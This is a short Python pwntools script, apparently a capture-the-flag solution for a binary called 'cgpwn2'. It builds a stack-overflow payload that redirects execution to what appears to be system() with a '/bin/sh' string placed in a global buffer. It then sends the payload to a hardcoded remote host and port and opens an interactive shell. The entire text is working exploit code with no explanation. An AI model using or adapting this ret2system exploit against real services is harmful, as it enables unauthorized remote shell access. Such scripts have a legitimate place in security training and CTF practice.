from pwn import *

context(arch="i386", os="linux", log_level="debug")

payload = "a" * 0x2a + p32(0x08048420) + p32(0xffffffff) + p32(0x804a080)

# p = process("./cgpwn2")
p = remote("111.198.29.45", 55312)
p.sendline("/bin/sh")
p.sendline(payload)

p.interactive()